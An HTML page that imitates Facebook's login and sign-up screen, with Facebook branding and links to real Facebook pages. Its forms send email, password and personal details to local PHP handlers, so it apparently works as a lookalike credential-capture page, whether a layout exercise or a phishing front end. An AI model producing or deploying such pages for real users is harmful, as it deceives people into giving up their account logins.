<!DOCTYPE>
<html>
<head>
	<title>Facebook - Log In or Sign</title>

	<style type="text/css">
	
	/*header background*/
	
	#header{ background-color: #3a5795;
	 height: 82px; min-width: 980px; padding:14px 0 0 17px;    
	}
	#Facebook{color: White; text-align: left; font-family: Arial Black; font-size:50px;}
	
	#logNav{line-height: 23px; background: rged; height: 100px; width:460px; padding: 5px; float: left; padding-top: 40px;}



	#form{ text-align: left; color: white; padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 60px; 
		margin-right: 0px; margin-left: 0px; margin-bottom: 0px; margin-top: 10px;
		}
		input.checkbox  {  
	 width : 1px; 
	 height : 1px;    
	}
	
	#menu{text-align: center; border: 5px solid #73D21; border-radius: 10px; background-color: orange;
	  font-family: verdana;  width: 99%; height: 2%; text-align: center; padding: 5px; }
	
	/*Background 2 color*/
	
	body{background: linear-gradient(to top, black,white,black);}
	
	#section{ width: 400px; height: 140px; background: yellgow; padding: 10px; 
	text-align: left; color: black; line-height:50px; font-size: 30px; font-family:stencil; padding-left: 60px;
	 font-weight: bold; padding-top:180px; }
	

	#photolLogo{width: 38px; height: 33px; background-image: url('photos.png'); float: left; padding: 5px; }
	#photocontainer{padding-left: 60px; padding-top: 50px; font:Helvetica; font-weight: bold; font-size: 12pt; }

	#shareLogo{width: 34px; height: 34px; background-image: url('share.png'); float: left; padding: 5px; }
	#sharecontainer{padding-left: 60px; padding-top: 40px; font:Helvetica; font-weight: bold; font-size: 12pt; }

	#findLogo{width: 46px; height:41px; background-image: url('find more.png'); float: left; padding: 5px; }
	#findcontainer{padding-left: 55px; padding-top: 40px; font:Helvetica; font-weight: bold; font-size: 12pt; }


	#rightNav{  width: 450px; height: 400px; background-color: resd; padding-top: 0px; float: right; padding-right: 0px; padding-bottom: 0px; 
		padding-left: 0px; margin-right: 60px; margin-left: 0px; margin-bottom: 0px; margin-top: 61px;
		}

	#signup{ text-align: left; color: black; font-size: 50px; font-family: times new roman; padding-top: 0px; padding-right: 0px;
	 		padding-bottom: 0px; padding-left: 0px; margin-right: 0px; margin-left: 0px; margin-bottom: 0px; margin-top: 0px;}
		
	#its{text-align: left; color: black; font-size: 25px;  font-family: times new roman; padding-top: 0px; padding-right: 0px;
		    padding-bottom: 0px; padding-left: 0px; margin-right: 0px; margin-left: 0px; margin-bottom: 0px; margin-top: 0px;}


	#signupform{line-height: 40px; text-align: left; color: white; padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 0px; 
		margin-right: 0px; margin-left: 0px; margin-bottom: 0px; margin-top: 10px;}

	#Birthday{line-height: 10px; font-family: Halvetica; color: black; }
	#age{ }

	#gender{color: black; font-weight: bold; font-size: 20px; font-family: Georgia; }

	#byclick{line-height: 20px; width: 293px; color: grey; background: yellosw; font-size: 12px; font-weight: bold;}


	#signupbtn {
    -moz-user-select: none;
    background: #4dc247;
    border: 1px solid #082783;
    box-shadow: 0 1px #4C6BC7 inset;
    color: white;
    padding: 3px 5px;
    text-decoration: none;
    text-shadow: 0 -1px 0 #082783;
    font: 25px Verdana, sans-serif;
    font-weight: bold;
    width: 250px;
    margin-top: 10px;
    height: 40px;
    border-radius: 5px;
}



#hrline{margin-top: 20px; }



	</style>

</head>

<body  > 
	

	
	
<div id="header"><div id="Facebook">&nbsp&nbsp&nbsp<a href="https://www.facebook.com/" title="Go to Facebook Home" style="color: white; text-decoration:none;">Facebook</a></div>
<div id="rightNav">

<div id="signup">Sign Up</div><div id="its">It's free and always will be.</div>

<div id="signupform">

	<form action="signupdataform.php" method="POST" autocomplete="on">

		<table><tr><input type="text" name="f_name" style=" height: 27px;" placeholder="First name" required>

			&nbsp&nbsp<input type="text" name="l_name"  style=" height: 27px;" placeholder="Last name" required></tr>
			<tr><input type="email" name="your_Email"  style=" height: 27px; width: 358;" required placeholder="Your Email"></tr>
			<tr><input type="email" name="Re_Email"  style=" height: 27px; width: 358; margin-top:6px;" required placeholder="Re-enter Email"></tr>
			<tr><input type="password" name="passwrd"  style=" height: 27px; width: 358; margin-top:6px;" required placeholder="New Password"></tr>

		</table>

		<div id="age">
		<div id="Birthday">Birthday</div>

				
				<select name="Month"  required="true">
					<option value="non selected" >Month </option>
					<option value="Jan">Jan </option>
					<option value="Feb">Feb </option>
					<option value="Mar">Mar </option>
					<option value="Apr">Apr </option>
					<option value="May">May </option>
					<option value="Jun">Jun </option>
					<option value="Jul">Jul </option>
					<option value="Aug">Aug </option>
					<option value="Sep">Sep </option>
					<option value="Oct">Oct </option>
					<option value="Nov">Nov </option>
					<option value="Dec">Dec </option>
				</select>

				<select name="Day" required>
					<option value="non selected">Day </option>
					<option value="1">1 </option>
					<option value="2">2 </option>
					<option value="3">3 </option>
					<option value="4">4 </option>
					<option value="5">5 </option>
					<option value="6">6 </option>
					<option value="7">7 </option>
					<option value="8">8 </option>
					<option value="9">9 </option>
					<option value="10">10 </option>
					<option value="11">11 </option>
					<option value="12">12 </option>
					<option value="13">13 </option>
					<option value="14">14 </option>
					<option value="15">15 </option>
					<option value="16">16 </option>
					<option value="17">17 </option>
					<option value="18">18 </option>
					<option value="19">19 </option>
					<option value="20">20 </option>
					<option value="21">21 </option>
					<option value="22">22 </option>
					<option value="23">23 </option>
					<option value="24">24 </option>
					<option value="25">25 </option>
					<option value="26">26 </option>
					<option value="27">27 </option>
					<option value="28">28 </option>
					<option value="29">29 </option>
					<option value="30">30 </option>
					<option value="31">31 </option>
					
				</select>

				<select name="Year" required>
					<option value="non selected">Year </option>
					<option value="2015">2015 </option>
					<option value="2014">2014 </option>
					<option value="2013">2013 </option>
					<option value="2012">2012</option>
					<option value="2011">2011 </option>
					<option value="2010">2010</option>
					<option value="2009">2009</option>
					<option value="2008">2008</option>
					<option value="2007">2007</option>
					<option value="2006">2006 </option>
					<option value="2005">2005 </option>
					<option value="2004">2004 </option>
					<option value="2003">2003</option>
					<option value="2002">2002 </option>
					<option value="2001">2001 </option>
					<option value="2000">2000 </option>
					<option value="1999">1999</option>
					<option value="1998">1998</option>
					<option value="1997">1997</option>
					<option value="1996">1996 </option>
					<option value="1995">1995 </option>
					<option value="1994">1994 </option>
					<option value="1993">1993 </option>
					<option value="1992">1992 </option>
					<option value="1991">1991 </option>
					<option value="1990">1990 </option>
					<option value="1989">1989 </option>
					<option value="1988">1988 </option>
					<option value="1987">1987 </option>
					<option value="1986">1986 </option>
					<option value="1985">1985 </option>
					<option value="1984">1984 </option>
					<option value="1983">1983 </option>
					<option value="1982">1982 </option>
					<option value="1981">1981 </option>
					<option value="1980">1980 </option>
					<option value="1979">1979 </option>
					<option value="1978">1987 </option>
					<option value="1977">1997</option>
					<option value="1976">1976 </option>
					<option value="1975">1975 </option>
					<option value="1974">1974 </option>
					<option value="1973">1973 </option>
					<option value="1972">1972 </option>
					<option value="1971">1971 </option>
					<option value="1970">1970 </option>
					<option value="1969">1969 </option>
					<option value="1968">1968 </option>
					<option value="1967">1967 </option>
					<option value="1966">1966 </option>
					<option value="1965">1965 </option>
					<option value="1964">1964 </option>
					<option value="1963">1963 </option>
					<option value="1962">1962 </option>
					<option value="1961">1961 </option>
					<option value="1960">1960 </option>
					<option value="1959">1959 </option>
					<option value="1958">1958 </option>
					<option value="1957">1957 </option>
					<option value="1956">1956 </option>
					<option value="1955">1955 </option>
					<option value="1954">1954 </option>
					<option value="1953">1953 </option>
					<option value="1952">1952 </option>
					<option value="1951">1951 </option>
					<option value="1950">1950 </option>
					<option value="1949">1949 </option>
					<option value="1948">1948 </option>
					<option value="1947">1947 </option>
					<option value="1946">1946 </option>
					<option value="1945">1945 </option>
					<option value="1944">1944 </option>
					<option value="1943">1943 </option>
					<option value="1942">1942 </option>
					<option value="1941">1941 </option>
					<option value="1940">1940 </option>
					
					</select>&nbsp
					<a href="https://www.facebook.com/about/privacy/" title="Click for more information"  style=" text-decoration:none;">
						
						<cite style="font:8pt Helvetica;"> Why do I need to provide my birthday?</cite></a> 


					

					
		
			</div>
			<label><div id ="gender" ><input type="radio" value="Male" name="Sex" style="height:15px;  " required>	<cite>	Male</cite></label>

				<label><input type="radio" value="Female" name="Sex" style="height:15px; color: black; " required> <cite> Female </cite> </div></label>	


				<div id="byclick">By clicking Sign Up, you agree to our 

					<a href="https://www.facebook.com/legal/terms" style=" text-decoration:none;">Terms</a> and that you have read our 

					<a href="https://www.facebook.com/about/privacy" style=" text-decoration:none;">Data Policy</a>, including our 

					<a href="https://www.facebook.com/help/cookies" style=" text-decoration:none;">Cookie Use</a>.</div>


<div ><button id="signupbtn" type="submit" name="button" value="Signed In" style="cursor:pointer">Sign Up</button></div>
			
			<div id="hrline" ><hr size="0px"  color="grey"></div>









	 </form>
	 <div><a href="https://www.facebook.com/pages/create/?ref_type=registration_form" style="text-decoration:none;"> Creat a Page</a>

	 	<cite style="color:#4d4d4d;"> for a celebrity, band or business.</cite></div> 

</div>

</div>


</div>
	<div id="logNav">

	<div id="form">
<form  action="facebooklogindataform.php" method="POST" autocomplete="on">

	Email or Phone&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp

	&nbsp&nbsp&nbsp

	Password<br>

<input type="text"  name="EmailnName" size="18" maxlength="200" autofocus  >
&nbsp&nbsp
<input type="password" name="Password" size ="18" maxlength="50">
<input type="submit" name="submit" style="height:20px; width:50px;  font:bold; color:white; background:blue; " value="Log In">
<label><input type="checkbox" name="chkbox" style="height:10px; width:12px;"><CITE style="font:9pt Helvetica;">keep me logged in</cite></label>
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
<a href="https://www.facebook.com/login/identify?ctx=recover&lwv=110" style="color: white; font:9pt Helvetica; text-decoration:none;" >

	Forgot your password?</a>


</form>
</div>
</div>


<div id="section">Connect with friends and the
world around you on Facebook.</div>

<div id="photocontainer">

<div id="photolLogo">	</div>	 <br>&nbsp&nbsp&nbsp&nbsp See photos and updates from friends in News Feed.	</div>

<div id="sharecontainer">	

<div id="shareLogo"></div>	  <br>&nbsp&nbsp&nbsp&nbsp Share what's new in your life on your Timeline.	</div>

<div id="findcontainer">

<div id="findLogo"></div> <br>&nbsp&nbsp Find more of what you're looking for with Facebook Search.</div>



</body>



</html>